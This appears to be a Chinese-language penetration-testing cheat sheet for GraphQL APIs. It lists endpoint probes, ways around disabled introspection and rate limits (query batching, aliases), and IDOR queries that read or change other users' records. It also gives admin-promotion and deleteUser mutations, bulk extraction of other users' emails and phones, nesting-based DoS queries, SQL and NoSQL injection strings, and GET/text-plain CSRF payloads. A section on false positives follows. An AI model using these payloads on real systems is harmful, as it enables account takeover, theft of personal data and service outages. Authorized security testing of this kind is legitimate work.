## 一、漏洞确认(摸这里能干什么,最重要)

**1. 确认是 GraphQL(入口)**
- 端点路径:`/graphql`/`/graphiql`/`/v1/graphql`/`/api/graphql`/`/query`/`/gql`
- 最小探针:`{"query":"{__typename}"}` → 返 `{"data":{"__typename":"Query"}}` 确认
- 指纹:graphw00f 识别引擎(Apollo/yoga/Hasura 等,决定后续 gadget 差异)

**2. Introspection 开没开(决定挖法)**
- 开:发完整 IntrospectionQuery 拿全 schema(InQL 自动跑 + 可视化);挖高价值锚点:
  - admin mutation:`deleteUser`/`updateRole`/`banUser`/`promoteToAdmin`
  - 内部字段:`isAdmin`/`internalId`/`secretToken`
  - 隐藏查询:`adminUsers`/`internalLogs`/`debugInfo`
  - 敏感类型:`CreditCard`/`BankAccount`/`PrivateMessage`
- 关(返错 "Cannot query on __schema"):走字段建议 + `__type` 单探 + bundle 提取(见绕过段)

**3. 限制摸边界(决定 DoS 能不能触发)**
- 深度限制:发深度 20 嵌套查询,看拦不拦
- 复杂度限制:发 100 字段查询,看拦不拦
- 速率限制:短时 100 次相同查询,看拦不拦
- Introspection 禁没禁:发 `__schema` 查询,返错→禁

## 二、绕过思路(按校验类型对症)

- **Introspection 拦**:字段建议("Did you mean")— 故意拼错字段 `user { passwrd }` → 响应 `Did you mean: password, passwordHash?` 枚举隐藏字段;`__type(name:"User")` 单类型探(常只拦 `__schema` 不拦 `__type`);JS/mobile bundle 提取字段(前端用的字段比 UI 控件多,挖 admin 专用字段)
- **速率限制**:Query Batching — 单请求发数组 `[{query:user(id:"1")},{query:user(id:"2")},...]` 绕速率;Alias 批量 `query { user1:user(id:"1") user2:user(id:"2") ... }`(单 query 多别名)
- **鉴权(水平)**:`user(id:"邻号")` 换号读他人;`updateUser(id:"邻号", input:{email:"attacker@evil.com"})` 改他人资料
- **鉴权(垂直)**:普通用户调 admin mutation `deleteUser(id:)`/`promoteToAdmin(userId:"自己")`
- **嵌套鉴权缺口**:关联对象字段校验弱(`user.posts.comments.author` 跨到他人)
- **Content-Type/CORS 预检**:`text/plain` 绕预检(预检只对 application/json 触发);GET 端点 `?query=mutation{deleteUser(id:"1"){success}}` 跨域 CSRF(`<img src=...>` 触发)
- **深度限制**:摸到限制边界,刚好卡限制下发深度嵌套

## 三、漏洞证明

### 越权(水平/垂直,核心危害)
- 水平读:`query { user(id:"邻号") { id email phone orders { id amount } } }` — 读他人邮箱/手机/订单
- 水平改:`mutation { updateUser(id:"邻号", input:{email:"attacker@evil.com"}) { id email } }` — 改他人资料(验证不实际破坏,只改自己可改回的)
- 垂直提权:`mutation { promoteToAdmin(userId:"自己") { user { id role } } }`;`mutation { deleteUser(id:"靶号") { success } }`
- 嵌套鉴权:`user(id:"自己").posts.comments.author` 跨到他人(author 字段校验弱)→ 读他人
- 越权场景/BOLA:这里只给 GraphQL 入参换号/跨级构造值

### 批量取全表(绕速率,核心危害)
- Batching:`[{query:user(id:"1")},...,{query:user(id:"1000")}]` 单请求取 1000 号
- Alias:`query { user1:user(id:"1") {...} ... user1000:user(id:"1000") {...} }`
- 一次取全表他人邮箱/手机 → 证明数据外带

### DoS(深度/复杂度/循环引用)
- 深度嵌套:`user.posts.comments.author.posts.comments.author...`(消耗 resolver 资源)
- 循环引用:`user.friends.friends.friends...`(自引用类型)
- 复杂度:100 字段 ×100 行(若有 list 返回)
- 证限制没有 → 一个查询占满 CPU/内存(慎用,按站)

### 注入(参数入参)
- SQL:`user(id:"1' OR '1'='1")` / `searchUsers(keyword:"admin' UNION SELECT password FROM users--")`
- NoSQL:`user(id:"{\"$ne\":null}")`
- 注入链/绕 WAF/读凭证:这里只给 GraphQL 入参是注入点的构造值

### 信息泄露
- 报错:`user(id:"invalid格式")` → 响应含 SQL 语句/内部路径 `/var/www/app/`/框架版本(开 debug 时)
- 字段建议:`user { passwrd }` → `Did you mean: password, passwordHash?` 枚举隐藏字段
- 调试指令:`__schema { directives { name } }` → `@debug`/`@internal` 指令存在=调试功能

### CSRF(GET 端点/text/plain)
- GET:`<img src="https://target/graphql?query=mutation{deleteUser(id:\"1\"){success}}">`(端点支持 GET 时)
- `text/plain`:绕 CORS 预检(预检不触发)发 mutation

## 四、误报场景

- Introspection 开但 schema 无敏感字段/无 admin mutation → 半条(只信息,不算洞)
- 越权查询返自己数据(id 是自己的)→ 不算
- mutation 有鉴权拦(`deleteUser` 返 401/403 "Not Authorized")→ 垂直越权不成立
- 批量查询被深度/复杂度/速率限制拦 → 不算(限制有效)
- DoS 被限制拦 → 不算
- 报错是通用错误(无 SQL/路径/版本)→ 不算信息泄露
- 端点只支持 POST 不支持 GET → GET CSRF 不成立
- `text/plain` 被服务端拒(只吃 application/json)→ 预检绕过不成立
- 字段建议关(关 suggestion)→ 拼错无 "Did you mean" → 枚举不成立
- 深度限制有效(深度 20 被拦)→ 嵌套 DoS 不成立
